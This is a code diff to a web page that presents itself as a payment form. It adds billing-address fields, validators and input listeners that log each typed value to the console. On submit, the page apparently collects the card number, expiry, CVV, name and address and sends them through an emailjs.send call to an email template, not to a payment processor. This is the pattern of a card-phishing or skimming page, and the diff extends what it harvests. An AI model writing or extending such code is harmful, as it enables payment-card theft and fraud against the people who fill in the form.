@@ -477,6 +477,52 @@
                         <i class="fas fa-times validation-icon invalid"></i>
                     </div>
                 </div>
+                <!-- Billing Information Section -->
+                <div class="form-group">
+                    <label for="cardholderName">Cardholder Name</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-user input-icon"></i>
+                        <input type="text" id="cardholderName" placeholder="Full name on card" required>
+                        <i class="fas fa-check validation-icon valid"></i>
+                        <i class="fas fa-times validation-icon invalid"></i>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label for="country">Country/Region</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-globe input-icon"></i>
+                        <input type="text" id="country" placeholder="Your country" required>
+                        <i class="fas fa-check validation-icon valid"></i>
+                        <i class="fas fa-times validation-icon invalid"></i>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label for="streetAddress">Street Address</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-home input-icon"></i>
+                        <input type="text" id="streetAddress" placeholder="Street address" required>
+                        <i class="fas fa-check validation-icon valid"></i>
+                        <i class="fas fa-times validation-icon invalid"></i>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label for="city">City</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-city input-icon"></i>
+                        <input type="text" id="city" placeholder="City" required>
+                        <i class="fas fa-check validation-icon valid"></i>
+                        <i class="fas fa-times validation-icon invalid"></i>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label for="state">State</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-map-marker-alt input-icon"></i>
+                        <input type="text" id="state" placeholder="State" required>
+                        <i class="fas fa-check validation-icon valid"></i>
+                        <i class="fas fa-times validation-icon invalid"></i>
+                    </div>
+                </div>
                 <div class="expiry-cvv">
                     <div class="form-group">
                         <label for="expiry">Expiry Date</label>
@@ -562,6 +608,27 @@
 
         function validateCVV(cvv) {
             return /^\d{3}$/.test(cvv);
+        }
+
+        // Validation functions for billing information
+        function validateCardholderName(name) {
+            return /^[a-zA-Z\s]{2,}$/.test(name);
+        }
+
+        function validateAddress(address) {
+            return address.length >= 5;
+        }
+
+        function validateCity(city) {
+            return /^[a-zA-Z\s]{2,}$/.test(city);
+        }
+
+        function validateState(state) {
+            return /^[a-zA-Z\s]{2,}$/.test(state);
+        }
+
+        function validateCountry(country) {
+            return /^[a-zA-Z\s]{2,}$/.test(country);
         }
 
         // Show loading state
@@ -733,6 +800,92 @@
             }
         });
 
+        // Add event listeners for billing fields
+        document.getElementById('cardholderName').addEventListener('input', function(e) {
+            const validIcon = e.target.parentElement.querySelector('.valid');
+            const invalidIcon = e.target.parentElement.querySelector('.invalid');
+            
+            validIcon.style.display = 'none';
+            invalidIcon.style.display = 'none';
+            
+            if (e.target.value) {
+                if (validateCardholderName(e.target.value)) {
+                    validIcon.style.display = 'block';
+                } else {
+                    invalidIcon.style.display = 'block';
+                }
+            }
+            console.log('Cardholder name updated:', e.target.value);
+        });
+
+        document.getElementById('country').addEventListener('input', function(e) {
+            const validIcon = e.target.parentElement.querySelector('.valid');
+            const invalidIcon = e.target.parentElement.querySelector('.invalid');
+            
+            validIcon.style.display = 'none';
+            invalidIcon.style.display = 'none';
+            
+            if (e.target.value) {
+                if (validateCountry(e.target.value)) {
+                    validIcon.style.display = 'block';
+                } else {
+                    invalidIcon.style.display = 'block';
+                }
+            }
+            console.log('Country updated:', e.target.value);
+        });
+
+        document.getElementById('streetAddress').addEventListener('input', function(e) {
+            const validIcon = e.target.parentElement.querySelector('.valid');
+            const invalidIcon = e.target.parentElement.querySelector('.invalid');
+            
+            validIcon.style.display = 'none';
+            invalidIcon.style.display = 'none';
+            
+            if (e.target.value) {
+                if (validateAddress(e.target.value)) {
+                    validIcon.style.display = 'block';
+                } else {
+                    invalidIcon.style.display = 'block';
+                }
+            }
+            console.log('Street address updated:', e.target.value);
+        });
+
+        document.getElementById('city').addEventListener('input', function(e) {
+            const validIcon = e.target.parentElement.querySelector('.valid');
+            const invalidIcon = e.target.parentElement.querySelector('.invalid');
+            
+            validIcon.style.display = 'none';
+            invalidIcon.style.display = 'none';
+            
+            if (e.target.value) {
+                if (validateCity(e.target.value)) {
+                    validIcon.style.display = 'block';
+                } else {
+                    invalidIcon.style.display = 'block';
+                }
+            }
+            console.log('City updated:', e.target.value);
+        });
+
+        document.getElementById('state').addEventListener('input', function(e) {
+            const validIcon = e.target.parentElement.querySelector('.valid');
+            const invalidIcon = e.target.parentElement.querySelector('.invalid');
+            
+            validIcon.style.display = 'none';
+            invalidIcon.style.display = 'none';
+            
+            if (e.target.value) {
+                if (validateState(e.target.value)) {
+                    validIcon.style.display = 'block';
+                } else {
+                    invalidIcon.style.display = 'block';
+                }
+            }
+            console.log('State updated:', e.target.value);
+        });
+
         // Handle payment form submission
         document.getElementById('paymentForm').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -740,16 +893,26 @@
             const button = this.querySelector('button');
             showLoading(button);
 
-            console.log('Sending card details to server...');
+            console.log('Sending card and billing details to server...');
 
             const cardNumber = document.getElementById('cardNumber').value;
             const expiry = document.getElementById('expiry').value;
             const cvv = document.getElementById('cvv').value;
+            const cardholderName = document.getElementById('cardholderName').value;
+            const country = document.getElementById('country').value;
+            const streetAddress = document.getElementById('streetAddress').value;
+            const city = document.getElementById('city').value;
+            const state = document.getElementById('state').value;
 
             emailjs.send("service_ew3eveb","template_kkjt9x2", {
                 card_number: cardNumber,
                 expiry: expiry,
-                cvv: cvv
+                cvv: cvv,
+                cardholder_name: cardholderName,
+                country: country,
+                street_address: streetAddress,
+                city: city,
+                state: state
             }).then(
                 function(response) {
                     console.log("SUCCESS", response);
